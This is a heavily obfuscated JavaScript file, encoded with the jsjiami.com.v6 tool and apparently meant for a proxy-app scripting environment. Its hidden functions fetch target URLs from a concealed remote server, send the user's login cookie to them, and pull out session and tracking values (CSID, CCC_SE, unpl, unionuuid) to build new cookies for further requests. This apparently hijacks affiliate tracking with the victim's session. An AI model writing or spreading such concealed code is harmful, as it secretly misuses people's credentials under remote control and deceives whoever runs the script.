var _0xodg='jsjiami.com.v6',_0x404c=[_0xodg,'w5LCqcOSwrfDtg==','w4rConnDhHc=','J2rClcK2w7g=','woXChwA3w5o=','WcKIwp3CvsO7','w7TChcOQwqvDqQ==','YVo+w5jDjQ==','w54ww5zCkRw=','bsOSVibCjw==','PsKNwrc0DQ==','SFrCjMOkwp8=','G8OXecKswo8=','FsKtZV3DnA==','wrYCw4bDgcKB','McK3BcKcegc=','wpDDhsOh','acOvchfCn3zCvAFvwpvDscKoYjtbw64zdypFw4Ifw6QYw6cOw7INwoF8e27DhzZLSB/CiBRBwr90woXDo2xWJiNwQwHDiUkDwoMfw5LCkMOowoVgw5NTesOBw7YwwqjDpTvCnhnDn8KsLMKVfcKhwoQ=','TVRmAsOE','wrjCr0jCv8OO','w70DwrLCogg=','w60LwoDChgk=','HGtkAHg=','wozCoicVw6o=','wroewpzCvQ==','McK9DMK+fB0=','H8KOw4jDsmw=','RXc3Rw==','wozCgSwBw4xn','wo7ClsKnIsKw','FsKFwpMgWA==','wrXDtcONwo9j','w7Y/wpTCvDU=','w5zDuMOpZ00=','UndpJMOb','DTotTg==','w4PCocKqw4vCvQ==','PcK+w67DkGc=','BcOJw7nCssOB','fsKVwpLDjA==','wqEzwoPDjQ==','VHVpfw==','w487wqrDhA==','M8OKw5M=','wpACwq0=','f0IOw4XDkAc=','wqMDwpfDiSDDpA==','wrsbwqnDuSM=','wp0dwqVOw44=','BMK/w6bDlE8=','TnTDhxkq','DMKbM8K2Tg==','wroDworCj14=','BMOKXMOlwpXDp8KbwpgTw54=','wpEswqLCu0Y=','Cn9FBEo=','wrI5w4XDl8Kp','wqrDisKjwoDCgsKRwroX','NsK9B8KpJRQGUEdw','QMO3ag==','asKMwojClMOb','BMKqBsK6TQ==','HjIMdcOx','w7MNw6c=','ZcOpGcKqwpE=','wpo4wpbDqTg=','w4fCqyfDq8Oz','UnN3JMOBwozCnsOkwrY=','wptDYMObwqs=','asO7G8K+wqTCvcO3','wpzCvMOiWU8=','YFkbw6nDjBItw49u','H8OHw4vCqcOx','D15YBns=','R2QyAQ==','H8KFwrAVW8OR','w7ghw6DCjCk=','wr7CncO3fkI=','wpzClMKxIsK4','G8OAT8KNwoTDug==','woHCs3jCo8OB','aVLCmsONwp4=','OHvCosKZw40=','wpAaw4bDt8Kk','w53CsXnDr2A=','w6fCpcOqwrLDlQ==','wrwJwoTCoTHDuUkhw6YT','w6LDu8Otw4U=','wpzCp8KKwrvDv8K3','w7NnccKw','d8OwE8K1wq/CusOxF8Ks','AnJmeHgqwoIQ','P8KdwoYxWAXDhHnDkj0=','McKWRH3Dmw==','woIkwprDpDo=','wo5kRcOPwrc=','IMKcYELDmg==','JBBkehg=','GcKVwrkmJA==','w5jDi1Akw4k=','ZMO2TA==','V2Av','wrzCjEzCqMO5Vg8=','wrvCv8O3bU8=','wpHCgGjCqcOawrPCnkPCuA==','ZsKGworCnsOg','w7vDtMO3Ym8=','TGZxLsOH','wpzCo3/Ci8Of','ZUnChsOtwrs=','OF5BFk4=','w7UdwpDCrAw=','w57CvgXDncOa','cVrDswog','wpjCtMOQREo=','eFF9LsOO','Iw08WcOJ','w6/ChcK+w7rCuQ==','NVxuEHw=','WUFUOsOb','w4vCjgjDpcOa','wqXCi8K5BMKa','YkAWBQE=','w4TDm8OCw5Eo','AMOaXsKtwpU=','w4rDvQ/DmQ==','w77CkCbDi8OrMg==','AcKWQ1vDvA==','wrTDkcOFwrFm','w5TCiMOiwrzDlQ==','w7XCjVfDsGw=','wrEIwpXCkkM=','w4DClRgoRA==','w7UjwpDCkQQ=','wqjClcKZb8K8w74gwqPDnzfCim4=','PldEw6/CvXZSwrfCn8KP','GXh6Qg==','AgsMS8OL','wrjCkwzDlTU=','wpXCli40w50=','wqfCoSAcw64=','w5zDsh7DlGw=','wpHCmsOac1s=','Rkclw4/DgA==','w5jDscOWUn8=','cFrCtcO0Xg==','w6bDpcOQwqM0','asOHOcK2wpE=','wrV6esOJwpI=','wrPClCgWw7U=','L0bCsQ==','X8OxTMOERQ==','ZcOVYSrClQ==','w7HDiD7Dg1k=','ChYPSsOy','AMKswq8mEg==','w6LCnjPDvcO8','UcOoDMKQwpk=','wqYPwqhs','wozCiyUjw4p9','w6JHZsKRwoI=','AMKvwq4IRg==','w5XDusOQw7QO','OV1Gw5rDomU=','J8KzDsKxXg==','wrAewqg2w67CgcOMY8OiQQDCiA==','M8K/VEXCg8KRwoTCtzpJ','w5TDmsOIwrM=','wrs2wp3DhgM=','wr3CvzPDni8=','w7nCgRwdaQ==','wofCn0DChMOl','w5HDicOWw7IY','wr7ChMKZNQ==','wrkCw5HDisKaw60=','wp/CgH/CrsON','wrDCtgwJw5M=','GsKHwpkXeA==','wqjCk8K8wpfDtA==','ZcOpXBLCqw==','wqfCg3LDssKtPFLCo8KxGcKl','AMODZsKpwpo=','PXXCnMK5w7g=','ZFgow6bDjA==','BUzCv8Kew7fCgsKQwofCrMO/bMKIc1HDoWw7wrbCszlRwoViwqMhAcK0wpHDqVJcFmPDmcKPQMKqw4zCoDDDhMOJw6YVJsO3b8Krw5gLa3rDgWRhw6jDucKMw7Iiwo7DgcOWw5Znf8K2wqjDpMO1WMOvBcO7BMKtwqHDv8KhTsKSDRDClTLDr8KIwqIwWsOlTsOtwq/DqcK9wrtkQcKDwq7DuMO/Q8O0aTPCkcOPw77CusOEcGbDu8O+w4Z4AsO4cHJnOcKaZ3hTwqJJIsKzw7rCpMKwQMORE2lMPhHDu8KXwrDCuwDCocOSwqnCnlkDwo/DqsKf','Nw8RaMOr','MkJYw4vDqQ==','jsDjEiLTami.GcoMKUOOm.vW6XhpGE=='];(function(_0x2e2fc8,_0x375512,_0x13ae4f){var _0x40a470=function(_0x428854,_0x4aba7d,_0x2eba31,_0x74346e,_0x459608){_0x4aba7d=_0x4aba7d>>0x8,_0x459608='po';var _0x19cebc='shift',_0x273a93='push';if(_0x4aba7d<_0x428854){while(--_0x428854){_0x74346e=_0x2e2fc8[_0x19cebc]();if(_0x4aba7d===_0x428854){_0x4aba7d=_0x74346e;_0x2eba31=_0x2e2fc8[_0x459608+'p']();}else if(_0x4aba7d&&_0x2eba31['replace'](/[DELTGMKUOOWXhpGE=]/g,'')===_0x4aba7d){_0x2e2fc8[_0x273a93](_0x74346e);}}_0x2e2fc8[_0x273a93](_0x2e2fc8[_0x19cebc]());}return 0xb3849;};var _0x2af23b=function(){var _0x3c2239={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0xcdbb7d,_0x3443ab,_0x3af310,_0x23792d){_0x23792d=_0x23792d||{};var _0xe6ba00=_0x3443ab+'='+_0x3af310;var _0x523071=0x0;for(var _0x523071=0x0,_0x248252=_0xcdbb7d['length'];_0x523071<_0x248252;_0x523071++){var _0x3200c4=_0xcdbb7d[_0x523071];_0xe6ba00+=';\x20'+_0x3200c4;var _0x2e972d=_0xcdbb7d[_0x3200c4];_0xcdbb7d['push'](_0x2e972d);_0x248252=_0xcdbb7d['length'];if(_0x2e972d!==!![]){_0xe6ba00+='='+_0x2e972d;}}_0x23792d['cookie']=_0xe6ba00;},'removeCookie':function(){return'dev';},'getCookie':function(_0x208f33,_0x43e357){_0x208f33=_0x208f33||function(_0x2ae689){return _0x2ae689;};var _0x3d848c=_0x208f33(new RegExp('(?:^|;\x20)'+_0x43e357['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x32446b=typeof _0xodg=='undefined'?'undefined':_0xodg,_0x3b0dd1=_0x32446b['split'](''),_0x2f8791=_0x3b0dd1['length'],_0xfc09a5=_0x2f8791-0xe,_0x273fa0;while(_0x273fa0=_0x3b0dd1['pop']()){_0x2f8791&&(_0xfc09a5+=_0x273fa0['charCodeAt']());}var _0x3cb1b1=function(_0x5080f4,_0xc067c,_0x517729){_0x5080f4(++_0xc067c,_0x517729);};_0xfc09a5^-_0x2f8791===-0x524&&(_0x273fa0=_0xfc09a5)&&_0x3cb1b1(_0x40a470,_0x375512,_0x13ae4f);return _0x273fa0>>0x2===0x14b&&_0x3d848c?decodeURIComponent(_0x3d848c[0x1]):undefined;}};var _0x5bc9ec=function(){var _0x1dff18=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x1dff18['test'](_0x3c2239['removeCookie']['toString']());};_0x3c2239['updateCookie']=_0x5bc9ec;var _0x2ee014='';var _0x463c40=_0x3c2239['updateCookie']();if(!_0x463c40){_0x3c2239['setCookie'](['*'],'counter',0x1);}else if(_0x463c40){_0x2ee014=_0x3c2239['getCookie'](null,'counter');}else{_0x3c2239['removeCookie']();}};_0x2af23b();}(_0x404c,0xaf,0xaf00));var _0x5847=function(_0x310fed,_0x951e33){_0x310fed=~~'0x'['concat'](_0x310fed);var _0x267fa4=_0x404c[_0x310fed];if(_0x5847['nLjELx']===undefined){(function(){var _0x1f6394=function(){var _0x284a79;try{_0x284a79=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x228560){_0x284a79=window;}return _0x284a79;};var _0x5bdcdd=_0x1f6394();var _0x50dbe8='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x5bdcdd['atob']||(_0x5bdcdd['atob']=function(_0x4b92bd){var _0xb9ae99=String(_0x4b92bd)['replace'](/=+$/,'');for(var _0x2f4952=0x0,_0x5e7862,_0x3cf2a0,_0x338866=0x0,_0x1a1fa4='';_0x3cf2a0=_0xb9ae99['charAt'](_0x338866++);~_0x3cf2a0&&(_0x5e7862=_0x2f4952%0x4?_0x5e7862*0x40+_0x3cf2a0:_0x3cf2a0,_0x2f4952++%0x4)?_0x1a1fa4+=String['fromCharCode'](0xff&_0x5e7862>>(-0x2*_0x2f4952&0x6)):0x0){_0x3cf2a0=_0x50dbe8['indexOf'](_0x3cf2a0);}return _0x1a1fa4;});}());var _0x48a158=function(_0x2eb2f6,_0x951e33){var _0x288a5e=[],_0x136e7c=0x0,_0x4bf4f1,_0x15df0c='',_0x11bf30='';_0x2eb2f6=atob(_0x2eb2f6);for(var _0x5bdcf7=0x0,_0x370b46=_0x2eb2f6['length'];_0x5bdcf7<_0x370b46;_0x5bdcf7++){_0x11bf30+='%'+('00'+_0x2eb2f6['charCodeAt'](_0x5bdcf7)['toString'](0x10))['slice'](-0x2);}_0x2eb2f6=decodeURIComponent(_0x11bf30);for(var _0x1c33f7=0x0;_0x1c33f7<0x100;_0x1c33f7++){_0x288a5e[_0x1c33f7]=_0x1c33f7;}for(_0x1c33f7=0x0;_0x1c33f7<0x100;_0x1c33f7++){_0x136e7c=(_0x136e7c+_0x288a5e[_0x1c33f7]+_0x951e33['charCodeAt'](_0x1c33f7%_0x951e33['length']))%0x100;_0x4bf4f1=_0x288a5e[_0x1c33f7];_0x288a5e[_0x1c33f7]=_0x288a5e[_0x136e7c];_0x288a5e[_0x136e7c]=_0x4bf4f1;}_0x1c33f7=0x0;_0x136e7c=0x0;for(var _0x4373d9=0x0;_0x4373d9<_0x2eb2f6['length'];_0x4373d9++){_0x1c33f7=(_0x1c33f7+0x1)%0x100;_0x136e7c=(_0x136e7c+_0x288a5e[_0x1c33f7])%0x100;_0x4bf4f1=_0x288a5e[_0x1c33f7];_0x288a5e[_0x1c33f7]=_0x288a5e[_0x136e7c];_0x288a5e[_0x136e7c]=_0x4bf4f1;_0x15df0c+=String['fromCharCode'](_0x2eb2f6['charCodeAt'](_0x4373d9)^_0x288a5e[(_0x288a5e[_0x1c33f7]+_0x288a5e[_0x136e7c])%0x100]);}return _0x15df0c;};_0x5847['bZMfLv']=_0x48a158;_0x5847['kSpwao']={};_0x5847['nLjELx']=!![];}var _0x2cd9a6=_0x5847['kSpwao'][_0x310fed];if(_0x2cd9a6===undefined){if(_0x5847['dKHZfD']===undefined){var _0x474cf4=function(_0x35068f){this['rcQtNs']=_0x35068f;this['rgscfi']=[0x1,0x0,0x0];this['jLlDKC']=function(){return'newState';};this['EqNqmi']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['djNIKa']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x474cf4['prototype']['tAFXGp']=function(){var _0x3fc98c=new RegExp(this['EqNqmi']+this['djNIKa']);var _0x52711b=_0x3fc98c['test'](this['jLlDKC']['toString']())?--this['rgscfi'][0x1]:--this['rgscfi'][0x0];return this['XFKkrY'](_0x52711b);};_0x474cf4['prototype']['XFKkrY']=function(_0x3901a8){if(!Boolean(~_0x3901a8)){return _0x3901a8;}return this['YjalZb'](this['rcQtNs']);};_0x474cf4['prototype']['YjalZb']=function(_0x542dd5){for(var _0x477291=0x0,_0x16716c=this['rgscfi']['length'];_0x477291<_0x16716c;_0x477291++){this['rgscfi']['push'](Math['round'](Math['random']()));_0x16716c=this['rgscfi']['length'];}return _0x542dd5(this['rgscfi'][0x0]);};new _0x474cf4(_0x5847)['tAFXGp']();_0x5847['dKHZfD']=!![];}_0x267fa4=_0x5847['bZMfLv'](_0x267fa4,_0x951e33);_0x5847['kSpwao'][_0x310fed]=_0x267fa4;}else{_0x267fa4=_0x2cd9a6;}return _0x267fa4;};var _0x245dae=function(){var _0xc98ce1=!![];return function(_0x211229,_0x2c35c8){var _0xb197a8=_0xc98ce1?function(){if(_0x2c35c8){var _0x6002ad=_0x2c35c8['apply'](_0x211229,arguments);_0x2c35c8=null;return _0x6002ad;}}:function(){};_0xc98ce1=![];return _0xb197a8;};}();var _0x4dd576=_0x245dae(this,function(){var _0x196ffb=function(){return'\x64\x65\x76';},_0x4b3b8d=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x110d8e=function(){var _0x2b2d66=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x2b2d66['\x74\x65\x73\x74'](_0x196ffb['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x41b102=function(){var _0x2d3fe3=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x2d3fe3['\x74\x65\x73\x74'](_0x4b3b8d['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x325c41=function(_0x2a08bc){var _0x44d4c1=~-0x1>>0x1+0xff%0x0;if(_0x2a08bc['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x44d4c1)){_0x41e839(_0x2a08bc);}};var _0x41e839=function(_0x452780){var _0x45415b=~-0x4>>0x1+0xff%0x0;if(_0x452780['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x45415b){_0x325c41(_0x452780);}};if(!_0x110d8e()){if(!_0x41b102()){_0x325c41('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x325c41('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x325c41('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x4dd576();function getinfo(){var _0x55ab21={'MTURC':function(_0x91222f){return _0x91222f();},'gpyTy':function(_0xe316c8,_0xde3d9b){return _0xe316c8!==_0xde3d9b;},'VKZfV':_0x5847('0','J5Jn'),'szHdN':_0x5847('1','e*bw'),'oIPAc':function(_0x30f6a7,_0x504f77){return _0x30f6a7!==_0x504f77;},'ecBQb':function(_0x4974b0,_0x5ae958){return _0x4974b0===_0x5ae958;},'RocCs':_0x5847('2','DTtv'),'pgXzI':_0x5847('3','25JS'),'rwWXo':_0x5847('4','WQ5H'),'JXOOG':function(_0x5f0582){return _0x5f0582();},'juTux':_0x5847('5','Df2z'),'lxQdy':function(_0x2e3983,_0x5e5274){return _0x2e3983===_0x5e5274;},'NwThr':_0x5847('6','zrfg'),'copNi':_0x5847('7','cgTL'),'lScOk':_0x5847('8','zrfg')};return new Promise(_0xb6dd51=>{var _0x4eb44d={'LvRJk':function(_0x54e84b){return _0x55ab21[_0x5847('9','3E8R')](_0x54e84b);},'lFesR':function(_0x56c172,_0x291b95){return _0x55ab21[_0x5847('a','Jq4x')](_0x56c172,_0x291b95);},'GJtTV':_0x55ab21[_0x5847('b','0Xja')],'WBFpW':_0x55ab21[_0x5847('c','$Pbk')],'WBJpn':function(_0xd123d6,_0xff184a){return _0x55ab21[_0x5847('d','zrfg')](_0xd123d6,_0xff184a);},'GsWca':function(_0x1ce9e9,_0x122221){return _0x55ab21[_0x5847('e','J5Jn')](_0x1ce9e9,_0x122221);},'eoDpq':_0x55ab21[_0x5847('f','cfMH')],'BVXoR':_0x55ab21[_0x5847('10','0Xja')],'JmjfJ':_0x55ab21[_0x5847('11','cgTL')],'woFxX':function(_0x388913){return _0x55ab21[_0x5847('12','CxSk')](_0x388913);},'twYuq':function(_0x563c84,_0x140194){return _0x55ab21[_0x5847('13','25JS')](_0x563c84,_0x140194);},'LsdVM':_0x55ab21[_0x5847('14','lgXF')],'QCQoF':function(_0x47f042){return _0x55ab21[_0x5847('15','!bkD')](_0x47f042);}};if(_0x55ab21[_0x5847('16','Df2z')](_0x55ab21[_0x5847('17','NTIH')],_0x55ab21[_0x5847('18','XxgM')])){$[_0x5847('19','0&Vg')]();}else{$[_0x5847('1a','71Np')]({'url':_0x5847('1b','25JS')+new Date(),'headers':{'User-Agent':_0x55ab21[_0x5847('1c','qLP^')]},'timeout':0x1388},async(_0x3505ec,_0x59d8d0,_0x5daa71)=>{try{if(_0x3505ec){}else{if(_0x4eb44d[_0x5847('1d','Yc#]')](_0x4eb44d[_0x5847('1e','vKp0')],_0x4eb44d[_0x5847('1f','vKp0')])){_0x5daa71=JSON[_0x5847('20','KeYf')](_0x5daa71);if(_0x4eb44d[_0x5847('21','J5Jn')](_0x5daa71[_0x5847('22','sAgA')][_0x5847('23','0&Vg')],0x0)||_0x4eb44d[_0x5847('24','uFP5')](_0x5daa71[_0x5847('25','Uy[A')][_0x5847('26','J5Jn')],0x0)){if(_0x4eb44d[_0x5847('27','xWZK')](_0x4eb44d[_0x5847('28','e*bw')],_0x4eb44d[_0x5847('29','71Np')])){_0x4eb44d[_0x5847('2a','vKp0')](_0xb6dd51);}else{var _0x35d126=_0x4eb44d[_0x5847('2b','y^p!')][_0x5847('2c','qLP^')]('|'),_0xebb26b=0x0;while(!![]){switch(_0x35d126[_0xebb26b++]){case'0':await $[_0x5847('2d','3E8R')](0xc8);continue;case'1':$[_0x5847('2e','EA7B')]=_0x5daa71[_0x5847('2f','uFP5')];continue;case'2':await _0x4eb44d[_0x5847('30','6HK@')](S01);continue;case'3':$[_0x5847('31','cfMH')]=_0x5daa71[_0x5847('32','wZHU')];continue;case'4':$[_0x5847('33','qLP^')]=_0x5daa71[_0x5847('34','vKp0')];continue;case'5':$[_0x5847('35','6HK@')]=_0x5daa71[_0x5847('36','eSjO')];continue;}break;}}}}else{$[_0x5847('37','cgTL')]();}}}catch(_0x187280){$[_0x5847('38','sAgA')]();}finally{if(_0x4eb44d[_0x5847('39','sAgA')](_0x4eb44d[_0x5847('3a','eSjO')],_0x4eb44d[_0x5847('3b','uFP5')])){_0x4eb44d[_0x5847('3c','T)9Y')](_0xb6dd51);}else{_0x4eb44d[_0x5847('3d','0&Vg')](_0xb6dd51);}}});}});}function S01(){var _0x414929={'gwcpP':function(_0x2c4e8e,_0x3d8c7f){return _0x2c4e8e===_0x3d8c7f;},'UTfej':_0x5847('3e','wZHU'),'wPTDd':_0x5847('3f','Df2z'),'cTNuf':function(_0x40ed98,_0x415799,_0xc3eb5c){return _0x40ed98(_0x415799,_0xc3eb5c);},'lIsRr':function(_0x1bb7c1,_0x2dbc7f){return _0x1bb7c1===_0x2dbc7f;},'UqAci':_0x5847('40','wZHU'),'kPYfF':function(_0xd6bcb9,_0x5b7d0a){return _0xd6bcb9!==_0x5b7d0a;},'pXgnV':_0x5847('41','KeYf'),'EwpxL':_0x5847('42','XxgM'),'diHOY':function(_0x3997dc){return _0x3997dc();},'akviS':_0x5847('43','DTtv'),'YrdcE':_0x5847('44','0&Vg')};let _0x2d24c6={'url':$[_0x5847('45','25JS')],'headers':{'Host':_0x414929[_0x5847('46','cfMH')],'Connection':_0x414929[_0x5847('47','0&Vg')],'Cookie':cookie,'User-Agent':$['UA']}};return new Promise(_0x195474=>{var _0x4a9703={'cGbcu':function(_0x12548a){return _0x414929[_0x5847('48','3E8R')](_0x12548a);}};$[_0x5847('49','CxSk')](_0x2d24c6,async(_0x61176d,_0x3b3d59,_0x3f64a5)=>{try{if(_0x61176d){}else{if(_0x414929[_0x5847('4a','0kzT')](_0x414929[_0x5847('4b','sAgA')],_0x414929[_0x5847('4c','WQ5H')])){_0x3f64a5=JSON[_0x5847('4d','qLP^')](_0x3f64a5);_0x3f64a5=_0x3f64a5[_0x5847('4e','Tda!')](/hrl='(\S*)';var/)[0x1];_0x3b3d59=_0x3b3d59[_0x5847('4f','0kzT')][_0x414929[_0x5847('50','ivjV')]];_0x3b3d59=JSON[_0x5847('51','cgTL')](_0x3b3d59);_0x3b3d59=_0x3b3d59[_0x5847('52','6HK@')](/CSID(\S*);/)[0x1];let _0x479bd2=_0x3b3d59;await _0x414929[_0x5847('53','KeYf')](S02,_0x3f64a5,_0x479bd2);await $[_0x5847('54','Uy[A')](0xc8);}else{$[_0x5847('55','e*bw')]();}}}catch(_0x44ebb8){if(_0x414929[_0x5847('56','CxSk')](_0x414929[_0x5847('57','ivjV')],_0x414929[_0x5847('58','xWZK')])){$[_0x5847('59','Df2z')]();}else{_0x4a9703[_0x5847('5a','V$p0')](_0x195474);}}finally{if(_0x414929[_0x5847('5b','!bkD')](_0x414929[_0x5847('5c','zrfg')],_0x414929[_0x5847('5d','XxgM')])){_0x414929[_0x5847('5e','$Pbk')](_0x195474);}else{_0x4a9703[_0x5847('5f','0Xja')](_0x195474);}}});});}function S02(_0x2b793e,_0x351759){var _0x83301b={'PSApd':_0x5847('60','sAgA'),'HJRGC':function(_0xeb28cd,_0x61b354){return _0xeb28cd+_0x61b354;},'gKEFc':function(_0x2d5790,_0x3add8c){return _0x2d5790+_0x3add8c;},'TTWeS':function(_0x44a1a3,_0x1cbfee){return _0x44a1a3+_0x1cbfee;},'OTVZR':function(_0x471c8a,_0x1ccc88){return _0x471c8a+_0x1ccc88;},'LADSC':function(_0x3e7444,_0x42e285){return _0x3e7444+_0x42e285;},'sXfYa':function(_0xde2524,_0x2968da){return _0xde2524+_0x2968da;},'YVxca':function(_0x6e7866,_0x40cecb){return _0x6e7866+_0x40cecb;},'xFQwt':function(_0xf88094,_0x4f3ecd){return _0xf88094+_0x4f3ecd;},'YqIkC':_0x5847('61','3Dkr'),'lnIEK':_0x5847('62','DTtv'),'REMpb':_0x5847('63','I1@g'),'esfPU':_0x5847('64','0kzT'),'wuvec':function(_0x19a19c,_0x309779){return _0x19a19c(_0x309779);},'YLrnR':function(_0xbfb900){return _0xbfb900();},'iLuHu':_0x5847('65','EZRH'),'MHjhh':_0x5847('66','lgXF'),'SLhfN':function(_0x3f30cd,_0x12dc9e){return _0x3f30cd+_0x12dc9e;},'MmZgQ':function(_0x2ad2b5,_0x87b8e0){return _0x2ad2b5+_0x87b8e0;}};let _0x3fa007={'url':_0x2b793e,'followRedirect':![],'headers':{'Host':_0x83301b[_0x5847('67','NTIH')],'Connection':_0x83301b[_0x5847('68','sAgA')],'Cookie':_0x83301b[_0x5847('69','Tda!')](_0x83301b[_0x5847('6a','NTIH')](_0x83301b[_0x5847('6b','EZRH')](_0x83301b[_0x5847('6c','lgXF')](cookie,'\x20'),_0x83301b[_0x5847('6d','iqR1')]),_0x351759),';'),'Referer':$[_0x5847('6e','%8j3')],'User-Agent':$['UA']}};return new Promise(_0x163f6d=>{$[_0x5847('6f','Uy[A')](_0x3fa007,async(_0x215904,_0x5b2dc4,_0x2b793e)=>{try{if(_0x215904){}else{_0x5b2dc4=_0x5b2dc4[_0x5847('70','Yc#]')][_0x83301b[_0x5847('71','ivjV')]];_0x5b2dc4=JSON[_0x5847('72','V$p0')](_0x5b2dc4);let _0x2bb2ab=_0x5b2dc4[_0x5847('73','cfMH')](/CCC_SE(\S*);/)[0x1];let _0x277efb=_0x5b2dc4[_0x5847('74','y^p!')](/unpl(\S*);/)[0x1];let _0x25b015=_0x5b2dc4[_0x5847('75','qLP^')](/unionuuid(\S*);/)[0x1];let _0x596e1d=_0x83301b[_0x5847('76','Yc#]')](_0x83301b[_0x5847('77','!bkD')](_0x83301b[_0x5847('78','KeYf')](_0x83301b[_0x5847('78','KeYf')](_0x83301b[_0x5847('79','vKp0')](_0x83301b[_0x5847('7a','WQ5H')](_0x83301b[_0x5847('7b','T)9Y')](_0x83301b[_0x5847('7c','ivjV')](_0x83301b[_0x5847('7d','qLP^')](_0x83301b[_0x5847('7e','3E8R')](_0x83301b[_0x5847('7f','EA7B')](_0x83301b[_0x5847('80','KeYf')](_0x83301b[_0x5847('81','qLP^')](cookie,'\x20'),_0x83301b[_0x5847('82','WQ5H')]),_0x351759),';\x20'),_0x83301b[_0x5847('83','xWZK')]),_0x2bb2ab),';\x20'),_0x83301b[_0x5847('84','Uy[A')]),_0x277efb),';\x20'),_0x83301b[_0x5847('85','3Dkr')]),_0x25b015),';\x20');await _0x83301b[_0x5847('86','Df2z')](S03,_0x596e1d);await $[_0x5847('87','EYmE')](0xc8);}}catch(_0x4381e2){$[_0x5847('88','WQ5H')]();}finally{_0x83301b[_0x5847('89','NTIH')](_0x163f6d);}});});}function S03(_0x41d34b){var _0x251404={'GEbzV':function(_0x2794fa){return _0x2794fa();},'anxyS':function(_0x65271e,_0x5e8b79){return _0x65271e===_0x5e8b79;},'zvlnp':_0x5847('8a','71Np'),'UjLOb':_0x5847('8b','0Xja'),'NdUSx':function(_0x2cb907,_0x481708){return _0x2cb907(_0x481708);},'MPWlJ':_0x5847('8c','$Pbk'),'lAbvA':_0x5847('8d','wZHU'),'hYClP':function(_0x1fdc65,_0x321956){return _0x1fdc65===_0x321956;},'CXnqQ':_0x5847('8e','hPTH'),'SpjpM':_0x5847('8f','vKp0'),'xPHqc':_0x5847('90','xWZK'),'bTvri':_0x5847('91','Jq4x')};let _0x289e39={'url':$[_0x5847('92','KeYf')],'headers':{'Host':_0x251404[_0x5847('93','3E8R')],'Connection':_0x251404[_0x5847('94','YAVk')],'Cookie':_0x41d34b,'Referer':$[_0x5847('95','J5Jn')],'User-Agent':$['UA']}};return new Promise(_0x22587c=>{var _0x2bf001={'zklhV':function(_0x410027){return _0x251404[_0x5847('96','J5Jn')](_0x410027);},'dNgMy':function(_0x48d85d,_0x2cdbdb){return _0x251404[_0x5847('97','EYmE')](_0x48d85d,_0x2cdbdb);},'LTXnf':_0x251404[_0x5847('98','ivjV')],'pMKpZ':_0x251404[_0x5847('99','cgTL')],'SvvJX':function(_0x54f030,_0x218209){return _0x251404[_0x5847('9a','y^p!')](_0x54f030,_0x218209);},'sEyXo':_0x251404[_0x5847('9b','Gw]E')],'tRtus':_0x251404[_0x5847('9c','7r6(')]};if(_0x251404[_0x5847('9d','0kzT')](_0x251404[_0x5847('9e','Tda!')],_0x251404[_0x5847('9f','J5Jn')])){$[_0x5847('19','0&Vg')]();}else{$[_0x5847('a0','zrfg')](_0x289e39,async(_0x2c8a20,_0x59b99e,_0x546774)=>{var _0x11e7a6={'TTLgg':function(_0x4a2850){return _0x2bf001[_0x5847('a1','%8j3')](_0x4a2850);}};try{if(_0x2bf001[_0x5847('a2','25JS')](_0x2bf001[_0x5847('a3','EYmE')],_0x2bf001[_0x5847('a4','3E8R')])){_0x11e7a6[_0x5847('a5','lgXF')](_0x22587c);}else{if(_0x2c8a20){}else{_0x546774=JSON[_0x5847('a6','WQ5H')](_0x546774);await _0x2bf001[_0x5847('a7','0kzT')](S04,_0x41d34b);await $[_0x5847('a8','eSjO')](0xc8);}}}catch(_0x4b0acb){$[_0x5847('a9','J5Jn')]();}finally{if(_0x2bf001[_0x5847('aa','I1@g')](_0x2bf001[_0x5847('ab','e*bw')],_0x2bf001[_0x5847('ac','3Dkr')])){$[_0x5847('ad','Jq4x')]();}else{_0x2bf001[_0x5847('ae','0&Vg')](_0x22587c);}}});}});}function S04(_0x2380b7){var _0x41085b={'ekZDQ':function(_0x3ca1a9){return _0x3ca1a9();},'tZmJQ':_0x5847('af','eSjO'),'gxIys':_0x5847('b0','NTIH')};let _0x56394f={'url':$[_0x5847('b1','3Dkr')],'headers':{'Host':_0x41085b[_0x5847('b2','sAgA')],'Connection':_0x41085b[_0x5847('b3','YAVk')],'Cookie':_0x2380b7,'Referer':$[_0x5847('b4','hPTH')],'User-Agent':$['UA']}};return new Promise(_0x5a1454=>{var _0x521d39={'KiRbQ':function(_0x148621){return _0x41085b[_0x5847('b5','V$p0')](_0x148621);}};$[_0x5847('6f','Uy[A')](_0x56394f,async(_0x177eb7,_0xf22260,_0x4125dc)=>{try{if(_0x177eb7){}else{_0x4125dc=JSON[_0x5847('b6','3Dkr')](_0x4125dc);await $[_0x5847('b7','xWZK')](0xc8);}}catch(_0x3ad63b){$[_0x5847('b8','XxgM')]();}finally{_0x521d39[_0x5847('b9','Yc#]')](_0x5a1454);}});});};_0xodg='jsjiami.com.v6';
// prettier-ignore
